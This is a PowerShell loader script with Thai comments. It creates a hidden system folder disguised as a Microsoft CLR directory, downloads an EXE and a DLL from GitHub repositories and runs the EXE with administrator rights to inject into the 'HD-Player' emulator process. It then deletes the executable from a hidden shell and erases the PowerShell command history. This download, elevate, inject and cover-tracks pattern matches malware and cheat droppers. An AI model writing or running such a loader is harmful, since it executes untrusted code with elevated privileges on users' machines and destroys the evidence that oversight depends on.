# 1. ตั้งค่าการทำงาน (เปิดการแจ้งเตือน Error ชั่วคราวเพื่อให้ตรวจสอบได้ง่ายขึ้น)
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย (สร้างและซ่อนโฟลเดอร์)
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (Test-Path $workDir) { 
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
& attrib +h +s $workDir

# กำหนดเส้นทางไฟล์และลิงก์ดาวน์โหลด
$exeOutput = Join-Path $workDir "WinHelper.exe"
$dllOutput = Join-Path $workDir "BASX.dll"

$exeUrl = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
$dllUrl = "https://github.com/zenxler98-ui/BASX/raw/refs/heads/main/BASX.dll"
$targetProcess = "HD-Player"

# 3. ล้างไฟล์เก่าและดาวน์โหลดไฟล์ใหม่ทั้ง EXE และ DLL
if (Test-Path $exeOutput) { Remove-Item $exeOutput -Force }
if (Test-Path $dllOutput) { Remove-Item $dllOutput -Force }

Write-Host "กำลังดาวน์โหลดไฟล์..." -ForegroundColor Yellow
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exeOutput)
    $wc.DownloadFile($dllUrl, $dllOutput)
} catch {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exeOutput -UseBasicParsing
    Invoke-WebRequest -Uri $dllUrl -OutFile $dllOutput -UseBasicParsing
}

# 4. ตรวจสอบและสั่งรันตัวรัน (EXE) ด้วยสิทธิ์ Admin เพื่อทำการ Inject เข้า HD-Player
if (Test-Path $exeOutput) {
    Write-Host "กำลังเรียกใช้งานตัวรันระบบ..." -ForegroundColor Green
    try {
        $sh = New-Object -ComObject Shell.Application
        $sh.ShellExecute($exeOutput, "", "", "runas", 1)
        Start-Sleep -Seconds 3
    } catch {
        Start-Process -FilePath $exeOutput -Verb RunAs
    }
} else {
    Write-Host "ไม่พบไฟล์ตัวรัน EXE!" -ForegroundColor Red
}

# 5. ตั้งเวลาลบไฟล์ EXE ทิ้งเบื้องหลังหลังผ่านไป 15 วินาที
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$exeOutput`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

# 6. ลบประวัติ PowerShell ป้องกันการเก็บบันทึกคำสั่ง
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
} catch {}

Write-Host "กระบวนการเสร็จสิ้นเรียบร้อย" -ForegroundColor Cyan
